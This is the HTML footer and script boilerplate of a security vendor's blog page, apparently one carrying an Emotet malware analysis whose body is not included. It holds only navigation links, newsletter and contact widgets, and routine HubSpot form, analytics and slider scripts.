  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/resource" role="menuitem">Blog</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://academy.picussecurity.com/" role="menuitem">Purple Academy</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/resource/tag/webinar" role="menuitem">Webinars</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/resource/tag/reports" role="menuitem">Reports</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/resource/tag/case-study" role="menuitem">Case Studies</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/resource/tag/press-releases" role="menuitem">Press Releases</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/resource/tag/datasheet" role="menuitem">Datasheets</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/resource/glossary" role="menuitem">Cyberpedia</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/events" role="menuitem">Events</a></li>
 </ul>
</div></span></div>		
   </div>
   <div class="footer-col">
	<p class="title">Company</p>
	<div id="hs_cos_wrapper_Company_Menu" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">
<span id="hs_cos_wrapper_Company_Menu_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="menu"><div id="hs_menu_wrapper_Company_Menu_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-vertical" role="navigation" data-sitemap-name="default" data-menu-id="32488280065" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/about-us" role="menuitem">About Us</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/leadership" role="menuitem">Leadership</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/careers-at-picus" role="menuitem">Careers</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/contact-us" role="menuitem">Contact</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://support.picussecurity.com" role="menuitem">Customer Support</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/trust-center" role="menuitem">Trust Center</a></li>
 </ul>
</div></span></div>
   </div>
   <div class="footer-col">
	<p class="title">Subscribe to Our Newsletter</p>
	<div id="hs_cos_wrapper_module_17059152999988" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><div class="subscribe-col">
 <span id="hs_cos_wrapper_module_17059152999988_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_form" style="" data-hs-cos-general-type="widget" data-hs-cos-type="form"><h3 id="hs_cos_wrapper_form_327594805_title" class="hs_cos_wrapper form-title" data-hs-cos-general-type="widget_field" data-hs-cos-type="text"></h3>

<div id="hs_form_target_form_327594805"></div>









</span>
 <p class="title">Contact Us</p> 
 
 
 
 
 <p class="detail"><a class="email" href="mailto:info@picussecurity.com">
	info@picussecurity.com
	</a></p>
 
 
 <p><a href="https://www.picussecurity.com/contact-us">
	Schedule a meeting
	</a>
 </p>
</div>

</div>
   </div>
  </div>
 </div>
 <div class="footer__copyright wow fadeIn content-wrapper">
  <div class="span3 footer__logo col">
   <div id="hs_cos_wrapper_module_16788980422085" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><a href="https://www.picussecurity.com" id="hs-link-Footer_Logo_hs_logo_widget" style="border-width:0px;border:0px;
					display: block;
					margin: 0 auto;
					text-align: CENTER;">


 

 
 
 
 
 <img src="https://www.picussecurity.com/hs-fs/hubfs/Logo_White.png?width=122&amp;height=30&amp;name=Logo_White.png" alt="Logo_White" loading="lazy" width="122" height="30" srcset="https://www.picussecurity.com/hs-fs/hubfs/Logo_White.png?width=61&amp;height=15&amp;name=Logo_White.png 61w, https://www.picussecurity.com/hs-fs/hubfs/Logo_White.png?width=122&amp;height=30&amp;name=Logo_White.png 122w, https://www.picussecurity.com/hs-fs/hubfs/Logo_White.png?width=183&amp;height=45&amp;name=Logo_White.png 183w, https://www.picussecurity.com/hs-fs/hubfs/Logo_White.png?width=244&amp;height=60&amp;name=Logo_White.png 244w, https://www.picussecurity.com/hs-fs/hubfs/Logo_White.png?width=305&amp;height=75&amp;name=Logo_White.png 305w, https://www.picussecurity.com/hs-fs/hubfs/Logo_White.png?width=366&amp;height=90&amp;name=Logo_White.png 366w" sizes="(max-width: 122px) 100vw, 122px">
 

 

</a></div>		
  </div>
  <div class="social-links col">

   <a class="social-links__link" href="https://www.linkedin.com/company/picus-security" rel="noopener" target="_blank">
	<span id="hs_cos_wrapper_footer_social_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_icon social-links__icon" style="" data-hs-cos-general-type="widget" data-hs-cos-type="icon"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewbox="0 0 2500 2389" style="enable-background:new 0 0 2500 2389;" xml:space="preserve">
	 <style type="text/css">
	  .st0{fill:#FFFFFF;}
	 </style>
	 <path class="st0" d="M0,277.5c0-80.4,28.2-146.8,84.5-199.1C140.8,26.1,214,0,304.1,0c88.5,0,160.1,25.7,214.8,77.2  c56.3,53.1,84.5,122.3,84.5,207.5c0,77.2-27.3,141.6-82,193.1c-56.3,53.1-130.3,79.6-222,79.6h-2.4c-88.5,0-160.1-26.5-214.8-79.6  S0,357.9,0,277.5z M31.4,2389V777h535.7v1612H31.4z M863.9,2389h535.7v-900.1c0-56.3,6.4-99.7,19.3-130.3  c22.5-54.7,56.7-101,102.6-138.8c45.8-37.8,103.4-56.7,172.5-56.7c180.2,0,270.3,121.5,270.3,364.4V2389H2500v-924.2  c0-238.1-56.3-418.7-168.9-541.7c-112.6-123.1-261.4-184.6-446.4-184.6c-207.5,0-369.2,89.3-485,267.9v4.8h-2.4l2.4-4.8V777H863.9  c3.2,51.5,4.8,211.5,4.8,480.2C868.7,1525.9,867.1,1903.2,863.9,2389z" />
	 </svg></span>
   </a>




   <a class="social-links__link" href="https://twitter.com/PicusSecurity" rel="noopener" target="_blank">
	<span id="hs_cos_wrapper_footer_social__2" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_icon social-links__icon" style="" data-hs-cos-general-type="widget" data-hs-cos-type="icon"><svg xmlns="http://www.w3.org/2000/svg" width="1200" height="1227" viewbox="0 0 1200 1227" fill="none">
	 <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="white" />
	 </svg></span>
   </a>




   <a class="social-links__link" href="https://www.youtube.com/channel/UC5mXhfkplWvuVW2Jx9MvOIw" rel="noopener" target="_blank">
	<span id="hs_cos_wrapper_footer_social__3" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_icon social-links__icon" style="" data-hs-cos-general-type="widget" data-hs-cos-type="icon"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" height="800px" width="800px" version="1.1" id="Layer_1" viewbox="0 0 461.001 461.001" xml:space="preserve" fill="#ffffff" stroke="#ffffff">

	 <g id="SVGRepo_bgCarrier" stroke-width="0" />

	 <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

	 <g id="SVGRepo_iconCarrier"> <g> <path style="fill:#ffffff;" d="M365.257,67.393H95.744C42.866,67.393,0,110.259,0,163.137v134.728 c0,52.878,42.866,95.744,95.744,95.744h269.513c52.878,0,95.744-42.866,95.744-95.744V163.137 C461.001,110.259,418.135,67.393,365.257,67.393z M300.506,237.056l-126.06,60.123c-3.359,1.602-7.239-0.847-7.239-4.568V168.607 c0-3.774,3.982-6.22,7.348-4.514l126.06,63.881C304.363,229.873,304.298,235.248,300.506,237.056z" /> </g> </g>

	 </svg></span>
   </a> 

  </div>
 </div>
 <div class="content-wrapper footer-col-wrap">	
  <div class="privacy-links wow fadeIn col">
   <div id="hs_cos_wrapper_footer_privacy_link1" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-text" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><span id="hs_cos_wrapper_footer_privacy_link1_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_text" style="" data-hs-cos-general-type="widget" data-hs-cos-type="text"><a href="https://www.picussecurity.com/terms">Terms</a></span></div>
   <div id="hs_cos_wrapper_footer_privacy_link2" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-text" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><span id="hs_cos_wrapper_footer_privacy_link2_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_text" style="" data-hs-cos-general-type="widget" data-hs-cos-type="text"><a href="https://www.picussecurity.com/trust-center/privacy-security">Security &amp; Privacy</a></span></div>


   <div id="hs_cos_wrapper_footer_privacy_link2" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-text" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><span id="hs_cos_wrapper_footer_privacy_link2_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_text" style="" data-hs-cos-general-type="widget" data-hs-cos-type="text">
	
	 <!-- Start of HubSpot code snippet -->
   <a id="hs_show_banner_button" style="" onclick="(function(){
					console.log('show banner clicked');
					var _hsp = window._hsp = window._hsp || [];
					_hsp.push(['showBanner']);
					})()">
	Cookie Settings
   </a>
	</span></div>

   <div id="hs_cos_wrapper_footer_privacy_link3" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-text" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><span id="hs_cos_wrapper_footer_privacy_link3_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_text" style="" data-hs-cos-general-type="widget" data-hs-cos-type="text"><a href="https://www.picussecurity.com/trust-center/kisisel-verilerin-korunmasi-kanunu"></a></span></div>


   <!-- End of HubSpot code snippet -->

  </div>	
  <div class="col copyright">
   <p>
	<span id="hs_cos_wrapper_footer_copyright_text_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_text" style="" data-hs-cos-general-type="widget" data-hs-cos-type="text">© 2025 Copyright. All rights reserved.</span>	 
   </p>
  </div>
 </div> 
</footer></div>
	 
	</div>
	
<!-- HubSpot performance collection script -->
<script defer src="/hs/hsstatic/content-cwv-embed/static-1.1293/embed.js"></script>
<script>
var hsVars = hsVars || {}; hsVars['language'] = 'en-us';
</script>

<script src="/hs/hsstatic/cos-i18n/static-1.53/bundles/project.js"></script>
<script src="https://www.picussecurity.com/hs-fs/hub/7048931/hub_generated/template_assets/32300259976/1729690095644/Shield/js/main.min.js"></script>

<script>
 $(document).on('ready', function() {

  if (window.innerWidth > 1200) {

   $(".announce-bar .w-container").on('init', function(event, slick){
	console.log("announcement bar - init.");
	// Once the slider is initialized, make it visible
	$("header.header.announce_prev .announce-content-wrapper").show();

   }).slick({
	slidesToShow: 1,
	slidesToScroll: 1,
	autoplay: true,
	speed: 3000,
	autoplaySpeed: 8000,
	pauseOnHover: false,
	arrows: true		
   });

  }
 });


 document.addEventListener('DOMContentLoaded', function () {
  var headerHeight = document.querySelector('header.header').offsetHeight;

  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
   anchor.addEventListener('click', function (e) {
	console.log("scroll. | via announcement bar");
	e.preventDefault();		
	// Extract only the value after the hash
	var targetId = this.getAttribute('href').split('#')[1];
	var targetElement = document.querySelector(targetId);
	if(targetId.indexOf("#") < 0) targetElement = document.querySelector("#" + targetId);

	if (targetElement) {
	 var targetPosition = targetElement.getBoundingClientRect().top + window.pageYOffset - headerHeight;
	 window.scrollTo({
	  top: targetPosition,
	  behavior: 'smooth'
	 });
	}
   });
  });
 });

</script>

<script src="https://www.picussecurity.com/hubfs/slick.min.js"></script>
<script src="https://www.picussecurity.com/hubfs/hub_generated/module_assets/1/161965429884/1736339641673/module_Mega_Menu_24.min.js"></script>
<!-- Start of Web Interactives Embed Code -->
<script defer src="https://js.hubspot.com/web-interactives-embed.js" type="text/javascript" id="hubspot-web-interactives-loader" data-loader="hs-previewer" data-hsjs-portal="7048931" data-hsjs-env="prod" data-hsjs-hublet="na1"></script>
<!-- End of Web Interactives Embed Code -->
<script src="//www.picussecurity.com/hubfs/hub_generated/template_assets/1/117283871284/1734698618665/template_header_height.min.js"></script>
<script src="https://www.picussecurity.com/hs-fs/hub/7048931/hub_generated/template_assets/158844553760/1727782857967/Shield/templates/partials/blog-post-layouts/js/main-blog.min.js"></script>
<script src="https://www.picussecurity.com/hs-fs/hubfs/hub_generated/module_assets/1/115636353426/1741437750102/module_glossary-toc.min.js"></script>
<script src="https://www.picussecurity.com/hs-fs/hub/7048931/hub_generated/template_assets/32497563799/1619786241508/Shield/js/slick.min.min.js"></script>

<script>
 $('.s2-featured-posts.module_17207012175882').each(function(){
   const $mod = $(this)
 const $arrows = $mod.find('.s2-featured-posts__arrows')
 const $slider = $mod.find('.s2-featured-posts__slider')

 $slider.slick({
  dots: false,
  arrows: true,
  infinite: false,
  speed: 1000,
  appendArrows: $arrows,
  autoplay: $slider.data('autoplay') ? true : false,
  autoplaySpeed: $slider.data('autoplay-speed') || 3000,
  slidesToShow: $slider.data('slidestoshow') || 3,
  slidesToScroll: 1,
  variableWidth: false,
  prevArrow: $arrows.find('.slick-prev'),
  nextArrow: $arrows.find('.slick-next'),
  responsive: [
   {
	breakpoint: 767,
	settings: {
	 slidesToShow: 2,
	}
   },
   {
	breakpoint: 575,
	settings: {
	 slidesToShow: 1,
	}
   }
  ]
 });
 })
</script>


    <!--[if lte IE 8]>
    <script charset="utf-8" src="https://js.hsforms.net/forms/v2-legacy.js"></script>
    <![endif]-->

<script data-hs-allowed="true" src="/_hcms/forms/v2.js"></script>

    <script data-hs-allowed="true">
        var options = {
            portalId: '7048931',
            formId: '10a2d0b0-9f91-4cd7-a1e0-1cff39706638',
            formInstanceId: '9658',
            
            pageId: '35193312585',
            
            region: 'na1',
            
            
            
            
            pageName: "Emotet Technical Analysis - Part 1 Reveal the Evil Code",
            
            
            
            
            
            
            css: '',
            target: '#hs_form_target_form_353648843',
            
            
            
            
            
            
            
            contentType: "blog-post",
            
            
            
            formsBaseUrl: '/_hcms/forms/',
            
            
            
            formData: {
                cssClass: 'hs-form stacked hs-custom-form'
            }
        };

        options.getExtraMetaDataBeforeSubmit = function() {
            var metadata = {};
            

            if (hbspt.targetedContentMetadata) {
                var count = hbspt.targetedContentMetadata.length;
                var targetedContentData = [];
                for (var i = 0; i < count; i++) {
                    var tc = hbspt.targetedContentMetadata[i];
                     if ( tc.length !== 3) {
                        continue;
                     }
                     targetedContentData.push({
                        definitionId: tc[0],
                        criterionId: tc[1],
                        smartTypeId: tc[2]
                     });
                }
                metadata["targetedContentMetadata"] = JSON.stringify(targetedContentData);
            }

            return metadata;
        };

        hbspt.forms.create(options);
    </script>

<script src="/hs/hsstatic/keyboard-accessible-menu-flyouts/static-1.17/bundles/project.js"></script>

    <script data-hs-allowed="true">
        var options = {
            portalId: '7048931',
            formId: '10a2d0b0-9f91-4cd7-a1e0-1cff39706638',
            formInstanceId: '4256',
            
            pageId: '35193312585',
            
            region: 'na1',
            
            
            
            
            pageName: "Emotet Technical Analysis - Part 1 Reveal the Evil Code",
            
            
            
            inlineMessage: "<p>Thank you.<\/p>",
            
            
            rawInlineMessage: "<p>Thank you.<\/p>",
            
            
            hsFormKey: "3b26fee4eac30f817f99f9c30717bd24",
            
            
            css: '',
            target: '#hs_form_target_form_327594805',
            
            
            
            
            
            
            
            contentType: "blog-post",
            
            
            
            formsBaseUrl: '/_hcms/forms/',
            
            
            
            formData: {
                cssClass: 'hs-form stacked hs-custom-form'
            }
        };

        options.getExtraMetaDataBeforeSubmit = function() {
            var metadata = {};
            

            if (hbspt.targetedContentMetadata) {
                var count = hbspt.targetedContentMetadata.length;
                var targetedContentData = [];
                for (var i = 0; i < count; i++) {
                    var tc = hbspt.targetedContentMetadata[i];
                     if ( tc.length !== 3) {
                        continue;
                     }
                     targetedContentData.push({
                        definitionId: tc[0],
                        criterionId: tc[1],
                        smartTypeId: tc[2]
                     });
                }
                metadata["targetedContentMetadata"] = JSON.stringify(targetedContentData);
            }

            return metadata;
        };

        hbspt.forms.create(options);
    </script>


<script>
 var checkbox = document.querySelector("footer .hs-form-booleancheckbox input[type='checkbox']");
 if (checkbox) {
	checkbox.checked = true;
 }
</script>


<!-- Start of HubSpot Analytics Code -->
<script type="text/javascript">
var _hsq = _hsq || [];
_hsq.push(["setContentType", "blog-post"]);
_hsq.push(["setCanonicalUrl", "https:\/\/www.picussecurity.com\/resource\/blog\/emotet-technical-analysis-part-1-reveal-the-evil-code"]);
_hsq.push(["setPageId", "35193312585"]);
_hsq.push(["setContentMetadata", {
    "contentPageId": 35193312585,
    "legacyPageId": "35193312585",
    "contentFolderId": null,
    "contentGroupId": 35190412163,
    "abTestId": null,
    "languageVariantId": 35193312585,
    "languageCode": "en-us",
    
    
}]);
</script>

<script type="text/javascript">
var hbspt = hbspt || {};
(hbspt.targetedContentMetadata = hbspt.targetedContentMetadata || []).push(...[]);

var _hsq = _hsq || [];
_hsq.push(["setTargetedContentMetadata", hbspt.targetedContentMetadata]);
</script>
<script type="text/javascript" id="hs-script-loader" async defer src="/hs/scriptloader/7048931.js"></script>
<!-- End of HubSpot Analytics Code -->


<script type="text/javascript">
var hsVars = {
    render_id: "92210916-bc0a-4d4d-9b88-e44155912558",
    ticks: 1741792137667,
    page_id: 35193312585,
    
    content_group_id: 35190412163,
    portal_id: 7048931,
    app_hs_base_url: "https://app.hubspot.com",
    cp_hs_base_url: "https://cp.hubspot.com",
    language: "en-us",
    analytics_page_type: "blog-post",
    scp_content_type: "",
    
    analytics_page_id: "35193312585",
    category_id: 3,
    folder_id: 0,
    is_hubspot_user: false
}
</script>


<script defer src="/hs/hsstatic/HubspotToolsMenu/static-1.432/js/index.js"></script>












 
<script>
  if (window.innerWidth > 768) { 
   
   
   
    // Load the CSS file dynamically
    var link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = "//cdn2.hubspot.net/hub/7048931/hub_generated/template_assets/32379319518/1682685745883/Shield/css/shield-animate.min.css";
    link.defer = true; // Ensures the CSS is loaded non-blocking
    document.head.appendChild(link);
   
    // Load only for desktop
    console.log("Load WOW only for desktop");
    var script = document.createElement('script');
    script.src = "//cdn2.hubspot.net/hub/7048931/hub_generated/template_assets/32379253675/1682685740703/Shield/js/shield-wow.min.js";
    script.async = true;

    // Initialize WOW.js after the script is loaded
    script.onload = function () {
      new WOW().init();
    };

    document.head.appendChild(script);
  }
</script>
</body></html>